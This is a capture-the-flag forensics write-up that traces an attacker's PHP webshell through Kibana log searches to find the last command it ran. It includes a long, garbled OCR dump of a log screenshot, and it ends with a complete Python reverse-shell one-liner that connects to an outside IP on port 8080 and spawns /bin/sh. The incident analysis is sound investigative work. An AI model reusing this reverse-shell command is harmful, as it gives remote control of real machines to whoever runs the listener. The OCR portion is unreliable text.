# Blue's Clues 6/8: Discovery
> Is that... a webshell?

> We can see the commands that were executed by the attacker. However, we don't see any command hinting at the creation of the rogue user in gitlab. There must be an intermediary step.

> What is the last command executed by the webshell?

> Flag format: <decoded_command> Not case sensitive, but keep special chars.

> Example: ls -latr

## About the Challenge
We need to find the last command executed by webshell

## How to Solve?
By using the same KQL syntax, I searched the logs one by one and check when the attacker stop accessing the webshell. And we found the last command was reverse shell command


[Image extracted text: logs-
url extension
php and http response status_code
200
Expanded document
View:
Single document
Surrounding documents
K <
5 of 246
X1
hostn
246 hits
Available fields
250
source
geo
region_name
Quebec
200
150
hosthostname
100
source
158. 69.62.65
observerhostname
May
June
July
August
2022
tags
apache-access
Apr 15,2022
Empty fields
url
extension
php
url.original
{uploads/ce52790629679d930ca16c39a4f619c3.ph
No fields match the selected filters.
Documents
Field statistics
p?command-python3820-c820r27import"2Osocket"2
Try:
1 field sorted
Csubprocess"2Cos 3Bs"3Dsocket
socket(socket
Using different field filters
INETS2Csocket
SOCk_STREAM)%3Bs
connect(
8622
@timestamp
Document
158.69.62.658228208080
%3Bos. dup2
fileno
CECD
'010'
Meta fields
()82c0
93B8200s
dup2
fileno
82C1 )%3B8200s
TaObf059-f1c9-4a33-980
dup2 ( s
fileno
92C2)%3Bp83Dsubprocess.call(
resses
88 . 126. 185.165
22 2Fbin 2Fsh 2282C922-1922]
963B927
ype
Standard_B2s
cloud
Apr
12 ,
2023
21:59:00.045
url
extension
php
@tin
url
path
(uploads/ce52790629679d930ca16c39a4f619c3 . php
ZaObf05g-f1c9-4a33-980:
t.ip
88 . 126 . 185.165
url
query
command-python3
import
socket
subprocess
s=socket
socket
socket.AF_INET
socket. SOCK
WebServer01
cloud. mach-
STREAM)
connect
158. 69.62.65" , 8080) ) ;os
Apr 12 ,
2023
21:59:00.000
url
extension
php
@tin
dup2
fileno( ) , 0)
dup2 ( s.fileno( ) , 1) ;
TaObf059-f1c9-4a33-980
dup2 ( s
fileno() ,2) ;pzsubprocess.call( ['
Ibi
resses
88 . 126 .185.165
n/sh
-i"))
ype
Standard_B2s
cloud
user_agent
device
name
Other
Apr
12 ,
2023
09:32:31.000
url
extension
php
@tin
Rows per page: 500
user_
agent
name
Firefox]


```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("158.69.62.65",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```